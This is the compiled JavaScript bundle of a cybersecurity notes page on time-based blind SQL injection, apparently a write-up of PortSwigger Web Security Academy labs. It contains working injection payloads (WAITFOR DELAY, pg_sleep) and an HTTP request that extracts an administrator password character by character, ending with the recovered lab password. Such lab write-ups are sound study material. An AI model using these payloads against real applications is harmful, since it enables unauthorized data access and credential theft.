"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[5809],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return g}});var i=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,i)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,i,r=function(e,t){if(null==e)return{};var n,i,r={},a=Object.keys(e);for(i=0;i<a.length;i++)n=a[i],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(i=0;i<a.length;i++)n=a[i],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=i.createContext({}),c=function(e){var t=i.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},p=function(e){var t=c(e.components);return i.createElement(l.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return i.createElement(i.Fragment,{},t)}},u=i.forwardRef((function(e,t){var n=e.components,r=e.mdxType,a=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),u=c(n),g=r,f=u["".concat(l,".").concat(g)]||u[g]||d[g]||a;return n?i.createElement(f,o(o({ref:t},p),{},{components:n})):i.createElement(f,o({ref:t},p))}));function g(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var a=n.length,o=new Array(a);o[0]=u;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:r,o[1]=s;for(var c=2;c<a;c++)o[c]=n[c];return i.createElement.apply(null,o)}return i.createElement.apply(null,n)}u.displayName="MDXCreateElement"},9884:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return c},toc:function(){return p},default:function(){return u}});var i=n(7462),r=n(3366),a=(n(7294),n(3905)),o=["components"],s={},l="Time based SQLi",c={unversionedId:"portswigger/Sql-injection/Time based sqli",id:"portswigger/Sql-injection/Time based sqli",title:"Time based SQLi",description:"In the preceding example, suppose that the application now catches database errors and handles them gracefully. Triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional errors will not work.",source:"@site/docs/portswigger/Sql-injection/Time based sqli.md",sourceDirName:"portswigger/Sql-injection",slug:"/portswigger/Sql-injection/Time based sqli",permalink:"/Cybernotes/docs/portswigger/Sql-injection/Time based sqli",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Retrieving multiple values within a single column",permalink:"/Cybernotes/docs/portswigger/Sql-injection/Retrieving multiple values within a single column"},next:{title:"Blind SSRF",permalink:"/Cybernotes/docs/portswigger/SSRF/Blind SSRF"}},p=[{value:"Lab 1",id:"lab-1",children:[],level:2},{value:"Lab 2",id:"lab-2",children:[],level:2}],d={toc:p};function u(e){var t=e.components,s=(0,r.Z)(e,o);return(0,a.kt)("wrapper",(0,i.Z)({},d,s,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"time-based-sqli"},"Time based SQLi"),(0,a.kt)("p",null,"In the preceding example, suppose that the application now catches database errors and handles them gracefully. Triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional errors will not work."),(0,a.kt)("p",null,"In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition. Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received."),(0,a.kt)("p",null,"The techniques for triggering a time delay are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"'; IF (1=2) WAITFOR DELAY '0:0:10'-- '; IF (1=1) WAITFOR DELAY '0:0:10'--")),(0,a.kt)("p",null,"The first of these inputs will not trigger a delay, because the condition ",(0,a.kt)("inlineCode",{parentName:"p"},"1=2")," is false. The second input will trigger a delay of 10 seconds, because the condition ",(0,a.kt)("inlineCode",{parentName:"p"},"1=1")," is true."),(0,a.kt)("p",null,"Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--")),(0,a.kt)("h2",{id:"lab-1"},"Lab 1"),(0,a.kt)("p",null,"--\x3e I tried different payloads for different languages and then i found the database as ",(0,a.kt)("inlineCode",{parentName:"p"},"postgresql")),(0,a.kt)("p",null,"--\x3e Then i used this payload :"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"'||(SELECT pg_sleep(10))--")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(1145).Z,width:"1887",height:"799"})),(0,a.kt)("h2",{id:"lab-2"},"Lab 2"),(0,a.kt)("p",null,"--\x3e we need to url encode our payload"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"GET / HTTP/1.1\nHost: ac561f391f05b39780dc3ba500db005d.web-security-academy.net\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: TrackingId=Z1vLE0dJIDLqmubp'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,\xa71\xa7,1)='\xa7a\xa7')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--; session=9C0MvWcMHNxQpDVq5C7najb7EK9vqN8M\nUpgrade-Insecure-Requests: 1\n")),(0,a.kt)("p",null,"--\x3e i got these results"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(4019).Z,width:"1477",height:"487"})),(0,a.kt)("p",null,"--\x3e after sorting them i got the password !"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"y40d3082rrsk1kpvbsds")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(2414).Z,width:"1381",height:"681"})))}u.isMDXComponent=!0},1145:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211003083304-706a99bd089402b2dd3aff0675d478f6.png"},2414:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211003130007-b41bd7228733b4a923f00d73b84d6a32.png"},4019:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211003130049-3795235b19ada318d6391e7fb64ab54d.png"}}]);